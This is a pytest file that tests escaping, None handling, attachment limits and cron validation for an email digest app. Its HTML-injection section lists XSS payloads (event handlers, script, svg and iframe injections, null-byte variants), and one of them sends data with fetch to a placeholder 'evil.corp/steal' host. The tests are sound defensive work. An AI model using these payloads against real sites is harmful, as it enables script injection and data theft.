"""
Empirical Challenge & Stress Suite for Milestone 4 Iteration 2 Remediations.
Author: challenger_m4_it2_1 (Empirical Challenger Subagent)
Module: tests.test_empirical_challenger_m4_it2

Direct Empirical Focus:
1. HTML Attribute Injection against dispatch/digest.py line 255:
   - Quotes (double, single, backticks, escaped)
   - Event handlers (onmouseover, onerror, onload, onclick, onfocus)
   - Scripts and style payloads
   - Null bytes (\x00) and unicode variations
   - HTML parser attribute verification (ensuring zero rogue attributes in DOM)
2. NoneType opportunities handling in format_digest_html and format_digest_text:
   - format_digest_html(None) returns clean empty digest without TypeError
   - format_digest_text(None) returns clean empty digest without TypeError
   - Permutations of None for candidate, date_str, opportunities containing [None]
3. Attachment limit enforcement in send_email:
   - send_email raises ValueError if cumulative attachments exceed 10 MB
   - Boundary test: exactly 10.0 MB allowed vs 10.0 MB + 1 byte rejected
   - Multi-attachment cumulative enforcement
   - Embedded MIMEApplication & EmailMessage payload enforcement
   - Verifying zero disk artifact creation when limit exceeded
4. Crontab validation in validate_cron_expression:
   - Step zero rejection across all 5 fields (*/0, 1-10/0, etc.)
   - Out-of-range field rejection (99 99 99 99 99, 60 min, 24 hr, 0/32 dom, 0/13 mon, 8 dow)
   - Inverted range rejection (50-10, 23-5, 30-1, 12-2, 6-2)
   - Boundary valid expressions (0 7 * * *, 0-59/5, named months/dows)
"""

from __future__ import annotations

import email
import html
from html.parser import HTMLParser
import os
from pathlib import Path
import sys
from typing import Any, Dict, List, Optional, Tuple, Union
from unittest.mock import patch

import pytest

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.message import EmailMessage

from dispatch.digest import (
    build_digest_email,
    format_digest_html,
    format_digest_text,
    _score_and_sort_opportunities,
)
from dispatch.mailer import (
    check_attachment_size_limit,
    extract_attachments_from_message,
    send_email,
)
from scheduler.daily_dispatch import validate_cron_expression
from ingestion.models import CandidateProfile


# ============================================================================
# Helper Parser for HTML Attribute Verification
# ============================================================================

class OpportunityCardParser(HTMLParser):
    """Parses HTML output to extract attributes of the opportunity card div."""

    def __init__(self):
        super().__init__()
        self.cards: List[Dict[str, Optional[str]]] = []

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]):
        if tag.lower() == "div":
            attr_dict = dict(attrs)
            if "data-opportunity-title" in attr_dict:
                self.cards.append(attr_dict)


# ============================================================================
# 1. Challenge Area 1: HTML Attribute Injection against dispatch/digest.py Line 255
# ============================================================================

class TestEmpiricalHTMLAttributeInjection:
    """Stress tests HTML attribute escaping on data-opportunity-title."""

    @pytest.mark.parametrize(
        "payload,expected_raw_breakout",
        [
            ('DevOps" onmouseover="alert(\'XSS\')" data-injected="', '" onmouseover='),
            ('DevOps" autofocus onfocus="alert(1)" x="', '" autofocus'),
            ('Architect" style="background:red" id="injected" x="', '" style="background:red"'),
            ('DevOps\' onclick=\'alert(1)\' data-foo=\'', "' onclick="),
            ('"><script>alert("XSS")</script><div data-x="', '"><script>'),
            ('"><img src="x" onerror="alert(1)">', '"><img'),
            ('"><svg onload="alert(1)">', '"><svg'),
            ('"><iframe src="javascript:alert(1)"></iframe>', '"><iframe'),
            ('title` onmouseover=alert(1) `', None),  # Double quotes protect against backticks
            ('test" onfocus="fetch(\'https://evil.corp/steal\')"', '" onfocus='),
            ('DevOps\x00" onmouseover="alert(1)" data-x="', '\x00" onmouseover='),
            ('Cloud\r\n\t" onmouseover="alert(1)"', '" onmouseover='),
            ('Engineer & < > " \' / ` = ;', None),
            ('<<SCRIPT>alert("XSS");//<</SCRIPT>', '<SCRIPT>'),
            ('DevOps ＂ onmouseover=alert(1)', None),  # Fullwidth quote U+FF02
            ('DevOps \u202E RTL Override', None),
        ],
    )
    def test_attribute_injection_payloads(self, payload: str, expected_raw_breakout: Optional[str]):
        """Verify that every malicious payload is safely escaped and does not break out into DOM attributes."""
        opp = {
            "title": payload,
            "company": "Adversarial Security Lab",
            "location": "Remote",
            "url": "https://example.com/job/sec-1",
            "description": "Adversarial injection verification opportunity.",
            "overall_score": 90.0,
            "breakdown": {"skills": 90.0, "title": 90.0, "metrics": 90.0, "mobility": 90.0, "certs": 90.0},
            "matched_skills": ["Python", "Security"],
            "missing_skills": [],
            "target_role": "Security Engineer",
            "rationale": "High match score testing.",
        }

        html_out = format_digest_html([opp])

        # 1. Unescaped attribute breakout must NOT occur
        if expected_raw_breakout:
            assert expected_raw_breakout not in html_out, (
                f"Unescaped breakout pattern '{expected_raw_breakout}' detected in generated HTML!"
            )

        # 2. Parse using Python's standard HTMLParser
        parser = OpportunityCardParser()
        parser.feed(html_out)
        assert len(parser.cards) >= 1, "Opportunity card was not found in parsed HTML."

        card_attrs = parser.cards[0]
        # Verify the only attributes on the card div are 'style' and 'data-opportunity-title'
        allowed_attrs = {"style", "data-opportunity-title"}
        rogue_attrs = set(card_attrs.keys()) - allowed_attrs
        assert not rogue_attrs, f"Rogue injected attributes detected on card div: {rogue_attrs}"

        # 3. Verify data-opportunity-title attribute value when parsed matches the unescaped payload
        # (Standard HTML parser automatically decodes &quot;, &lt;, &gt;, &#x27; back into payload characters)
        assert card_attrs["data-opportunity-title"] == str(payload), (
            f"Parsed attribute value '{card_attrs['data-opportunity-title']}' did not match original payload!"
        )

    def test_null_byte_in_title(self):
        """Verify that null bytes (\x00) do not cause C-string truncation or bypass escaping."""
        null_payload = 'DevOps\x00" onmouseover="alert(1)" data-x="'
        opp = {
            "title": null_payload,
            "company": "NullByte Inc",
            "location": "Remote",
            "url": "https://example.com/null",
            "overall_score": 85.0,
        }
        html_out = format_digest_html([opp])
        assert 'onmouseover="alert(1)"' not in html_out
        assert 'data-opportunity-title="DevOps\x00&quot;' in html_out

    def test_extreme_length_title_escaping(self):
        """Verify that 20,000 character title with quotes does not cause regex catastrophic backtracking."""
        massive_payload = 'Cloud " ' * 10000 + '" onmouseover="alert(1)"'
        opp = {
            "title": massive_payload,
            "company": "Scale Test",
            "location": "Remote",
            "url": "https://example.com/scale",
            "overall_score": 75.0,
        }
        html_out = format_digest_html([opp])
        assert 'onmouseover="alert(1)"' not in html_out
        assert 'data-opportunity-title=' in html_out


# ============================================================================
# 2. Challenge Area 2: NoneType Normalization in Digest Formatters
# ============================================================================

class TestEmpiricalNoneHandling:
    """Stress tests None handling in format_digest_html, format_digest_text, and helpers."""

    def test_format_digest_html_with_none_returns_clean_digest(self):
        """format_digest_html(None) must return clean empty digest without TypeError."""
        html_out = format_digest_html(None)
        assert isinstance(html_out, str)
        assert len(html_out) > 0
        assert "<!DOCTYPE html>" in html_out
        assert "No Opportunities Discovered Today" in html_out or "No external postings" in html_out
        assert "99.9%" in html_out  # Verified SLA badge present
        assert "99%" in html_out

    def test_format_digest_text_with_none_returns_clean_digest(self):
        """format_digest_text(None) must return clean empty digest without TypeError."""
        text_out = format_digest_text(None)
        assert isinstance(text_out, str)
        assert len(text_out) > 0
        assert "DAILY CAREER & OPPORTUNITY DIGEST" in text_out
        assert "No opportunities matched" in text_out
        assert "99.9%" in text_out
        assert "99%" in text_out

    def test_all_none_arguments(self):
        """All arguments None in format_digest_html and format_digest_text."""
        html_out = format_digest_html(None, candidate=None, date_str=None)
        text_out = format_digest_text(None, candidate=None, date_str=None)
        assert isinstance(html_out, str)
        assert isinstance(text_out, str)
        assert "John Victor Aniekwe" in html_out
        assert "John Victor Aniekwe" in text_out

    def test_list_containing_none_elements(self):
        """List containing None elements [None, None] must not raise AttributeError or TypeError."""
        mixed_list = [
            None,
            {"title": "DevOps Engineer", "company": "Valid Corp", "overall_score": 85.0},
            None,
        ]
        html_out = format_digest_html(mixed_list)
        text_out = format_digest_text(mixed_list)
        assert isinstance(html_out, str)
        assert isinstance(text_out, str)
        assert "Valid Corp" in html_out
        assert "Valid Corp" in text_out
        assert "1 Opportunities Evaluated" in html_out

    def test_score_and_sort_opportunities_direct_call_with_none(self):
        """_score_and_sort_opportunities(None, profile) returns empty list."""
        from ingestion.parser import load_profile
        profile = load_profile()
        res = _score_and_sort_opportunities(None, profile)
        assert res == []

        res_empty = _score_and_sort_opportunities([], profile)
        assert res_empty == []

        res_nones = _score_and_sort_opportunities([None, None], profile)
        assert res_nones == []


# ============================================================================
# 3. Challenge Area 3: Attachment Size Limit Enforcement in send_email
# ============================================================================

class TestEmpiricalAttachmentLimitEnforcement:
    """Stress tests attachment limit enforcement (default 10 MB limit) in send_email."""

    def test_send_email_raises_valueerror_on_oversized_direct_attachments(self, tmp_path):
        """send_email raises ValueError when cumulative attachments exceed 10 MB."""
        msg = MIMEMultipart()
        msg["From"] = "test@example.com"
        msg["To"] = "candidate@example.com"
        msg["Subject"] = "Test Digest"

        # 12 MB attachment
        twelve_mb = 12 * 1024 * 1024
        oversized = [("massive.dat", b"X" * twelve_mb)]

        with pytest.raises(ValueError, match="10 MB limit"):
            send_email(msg, dry_run=True, output_dir=tmp_path, attachments=oversized)

        # Verify no .eml was written to tmp_path
        eml_files = list(tmp_path.glob("*.eml"))
        assert len(eml_files) == 0, "No file should be written when attachment limit is exceeded!"

    def test_exact_10mb_boundary(self, tmp_path):
        """Exactly 10 MB is allowed; 10 MB + 1 byte is rejected."""
        msg = MIMEMultipart()
        msg["From"] = "test@example.com"
        msg["To"] = "candidate@example.com"
        msg["Subject"] = "Boundary Test"

        ten_mb = 10 * 1024 * 1024
        exact_attachment = [("exact_10mb.bin", b"0" * ten_mb)]

        # Exactly 10 MB should succeed
        eml_path = send_email(msg, dry_run=True, output_dir=tmp_path, attachments=exact_attachment)
        assert os.path.exists(eml_path)

        # 10 MB + 1 byte should fail
        over_attachment = [("over_10mb.bin", b"0" * (ten_mb + 1))]
        with pytest.raises(ValueError, match="10 MB limit"):
            send_email(msg, dry_run=True, output_dir=tmp_path, attachments=over_attachment)

    def test_multi_attachment_cumulative_enforcement(self, tmp_path):
        """Multiple attachments whose sum exceeds 10 MB are rejected."""
        msg = MIMEMultipart()
        msg["From"] = "test@example.com"
        msg["To"] = "candidate@example.com"
        msg["Subject"] = "Multi Attachment Test"

        two_mb = 2 * 1024 * 1024
        # 5 x 2 MB = 10 MB (should succeed)
        five_atts = [(f"doc_{i}.pdf", b"A" * two_mb) for i in range(5)]
        eml_path = send_email(msg, dry_run=True, output_dir=tmp_path, attachments=five_atts)
        assert os.path.exists(eml_path)

        # 6 x 2 MB = 12 MB (should fail)
        six_atts = [(f"doc_{i}.pdf", b"A" * two_mb) for i in range(6)]
        with pytest.raises(ValueError, match="10 MB limit"):
            send_email(msg, dry_run=True, output_dir=tmp_path, attachments=six_atts)

    def test_pre_attached_mimemultipart_enforcement(self, tmp_path):
        """send_email inspects pre-attached MIME parts and enforces limit even if attachments arg is None."""
        msg = MIMEMultipart("mixed")
        msg["From"] = "test@example.com"
        msg["To"] = "candidate@example.com"
        msg["Subject"] = "Pre-attached MIME Test"

        # Pre-attach 11 MB payload
        payload = b"Z" * (11 * 1024 * 1024)
        part = MIMEApplication(payload)
        part.add_header("Content-Disposition", "attachment", filename="huge_cv.pdf")
        msg.attach(part)

        with pytest.raises(ValueError, match="10 MB limit"):
            send_email(msg, dry_run=True, output_dir=tmp_path)

    def test_pre_attached_emailmessage_enforcement(self, tmp_path):
        """send_email inspects EmailMessage.iter_attachments() and enforces limit."""
        msg = EmailMessage()
        msg["From"] = "test@example.com"
        msg["To"] = "candidate@example.com"
        msg["Subject"] = "EmailMessage Test"
        msg.set_content("Plain text body")

        payload = b"Q" * (11 * 1024 * 1024)
        msg.add_attachment(payload, maintype="application", subtype="pdf", filename="large.pdf")

        with pytest.raises(ValueError, match="10 MB limit"):
            send_email(msg, dry_run=True, output_dir=tmp_path)


# ============================================================================
# 4. Challenge Area 4: Crontab Validation in validate_cron_expression
# ============================================================================

class TestEmpiricalCronValidation:
    """Stress tests validate_cron_expression against edge cases, step zero, and inverted ranges."""

    @pytest.mark.parametrize(
        "cron_expr,expected",
        [
            # Standard valid expressions
            ("0 7 * * *", True),
            ("0 8 * * 1-5", True),
            ("*/15 * * * *", True),
            ("0,30 8-17 * * 1-5", True),
            ("0 0 1 1 *", True),
            ("59 23 31 12 7", True),
            ("0-59/5 * * * *", True),
            ("0 0 * JAN-DEC SUN-SAT", True),
            ("0 0 * * MON-FRI", True),

            # Step zero expressions (MUST be rejected)
            ("*/0 * * * *", False),
            ("0 */0 * * *", False),
            ("* * */0 * *", False),
            ("* * * */0 *", False),
            ("* * * * */0", False),
            ("1-10/0 * * * *", False),
            ("0/0 * * * *", False),
            ("*/00 * * * *", False),

            # Out of range expressions (MUST be rejected)
            ("99 99 99 99 99", False),
            ("60 * * * *", False),         # Minute max 59
            ("-1 * * * *", False),
            ("* 24 * * *", False),         # Hour max 23
            ("* * 0 * *", False),          # Day of Month min 1
            ("* * 32 * *", False),         # Day of Month max 31
            ("* * * 0 *", False),          # Month min 1
            ("* * * 13 *", False),         # Month max 12
            ("* * * * 8", False),          # Day of Week max 7
            ("10-70 * * * *", False),      # Upper range out of bounds
            ("* 5-25 * * *", False),       # Upper range out of bounds

            # Inverted ranges (MUST be rejected)
            ("50-10 * * * *", False),
            ("* 23-5 * * *", False),
            ("* * 30-1 * *", False),
            ("* * * 12-2 *", False),
            ("* * * * 6-2", False),
            ("* * * DEC-JAN *", False),
            ("* * * * SAT-MON", False),

            # Invalid field counts and malformed inputs
            ("", False),
            ("   ", False),
            ("0 7", False),                # 2 fields
            ("0 7 *", False),              # 3 fields
            ("0 7 * *", False),            # 4 fields
            ("0 0 7 * * *", False),        # 6 fields
            ("0 0 7 * * * *", False),      # 7 fields
            ("0 7 * * * * * *", False),    # 8 fields
            ("0 7 * * * extra", False),
            ("a b c d e", False),
            ("0 7 * * * /", False),
            ("0 7 * * *,", False),
            ("0 7 * * *//5", False),
        ],
    )
    def test_cron_expressions(self, cron_expr: str, expected: bool):
        """Empirically test each cron expression against validate_cron_expression."""
        assert validate_cron_expression(cron_expr) is expected, (
            f"validate_cron_expression({cron_expr!r}) returned {not expected}, expected {expected}"
        )

    @pytest.mark.parametrize("invalid_type", [None, 12345, 0.7, ["0", "7", "*", "*", "*"], {"cron": "0 7 * * *"}])
    def test_cron_non_string_types(self, invalid_type: Any):
        """Non-string types passed to validate_cron_expression must return False without crashing."""
        assert validate_cron_expression(invalid_type) is False
